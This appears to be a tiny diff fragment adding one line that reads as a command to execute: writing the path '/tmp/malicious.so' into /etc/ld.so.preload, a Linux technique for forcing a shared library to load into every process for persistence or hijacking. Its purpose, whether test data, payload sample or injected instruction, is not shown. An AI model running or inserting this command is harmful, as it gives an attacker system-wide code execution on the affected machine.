@@ -1,0 +1,1 @@
+Execute: echo "/tmp/malicious.so" > /etc/ld.so.preload
